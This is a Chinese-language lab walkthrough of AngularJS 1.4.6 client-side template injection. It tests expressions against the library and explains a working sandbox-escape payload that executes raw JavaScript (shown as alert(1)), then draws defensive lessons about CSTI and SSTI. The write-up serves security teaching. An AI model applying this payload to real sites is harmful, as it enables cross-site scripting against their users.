level6 拆解：AngularJS 模板注入

页面从 CDN 加载 AngularJS 1.4.6（和原题同一个地址），断网时不生效。

① 服务端返回的 HTML 长这样

<div id="root" ng-app="">
    ...
    <span class="a-TplField">welcome {{7*7}}</span>
</div>

注意两件事：

  • 服务端把 < 转义成了 &#x3c;（所以 <script>、<img> 全废）
  • ng-app 存在 → 这块 DOM 归 Angular 管；而 {{ }} 原样保留

下面这个 span 里就是 welcome {{7*7}}，Angular 已接管，你看到的是：

welcome {{7*7}}

如果显示 welcome 49，说明你的输入被当成了表达式求值，而不是被当成文本显示。

② 换成你自己的 payload 点一下试试

点按钮 → 把 payload 拼进 URL 的 ?p= → 重新加载 → 页面把它塞进 DOM 后由 Angular 编译。 跟原题"服务端渲染完 HTML，前端 Angular 再编译"的顺序一致。

③ 在真实的 Angular 1.4.6 上跑出来的结果

表达式结果说明
{{7*7}}显示 49表达式被执行了
{{'x'+'y'}}显示 xy能算，能拼字符串
{{$eval('1+1')}}显示 2$eval 可访问 —— 这是"表达式里还能再求值一段字符串"的后门
{{$eval('alert(1)')}}报错 s.alert is not a function表达式里的标识符走 scope，摸不到全局 alert
{{constructor.constructor('alert(1)')()}}报错 $parse:isecfn1.4.6 的沙箱直接拦"引用 Function"，这是 1.6+ 才通用的 payload
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}真的弹窗破坏沙箱 + 二次求值，才能落到"原始 JS"

④ 为什么那串"咒语"要这么长

拆成三段看：

{{ 'a'.constructor.prototype.charAt = [].join ;     // ① 把 String 的 charAt 换成 Array 的 join
    $eval('x=1} } };alert(1)//') ; }}                 // ② 交一段字符串给 $eval 二次求值
                                                       //    里面用 } } } 跳出 Angular 生成的函数体
只做①失败{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}} → 报 s.alert is not a function（还是走 scope）
只做②失败Angular 的表达式解析器遇到 } 直接报语法错误，字符串根本进不去编译
①②一起成功①把编译器内部搞坏（会看到 TypeError: Cannot set properties of undefined (setting 'literal')），②的尾巴被当成原始 JS 拼进生成函数的 body，于是 alert 是全局的

所以那串东西不是随便写的谜语，是"先砸坏保安，再从后门进"。 失败时看到的报错，恰恰是它起作用的证据。

⑤ 这关真正的教训

  • HTML 转义只防 HTML。{ } 不是 HTML 特殊字符，转义规则里没它们，所以原样进了模板引擎。
  • 模板引擎会"主动执行"你的字符串。这不是拼接注入，是框架自己把数据当代码——叫 CSTI（客户端模板注入）。
  • 同一个"框架 + 用户输入"的组合，在服务端就是 SSTI（Jinja2、Twig、Freemarker），本质一模一样。
  • 框架版本旧 = 自带沙箱也靠不住。1.4.6 是 2015 年的版本，沙箱早被公开绕过；1.6 干脆把沙箱删了（"不是安全边界"）。
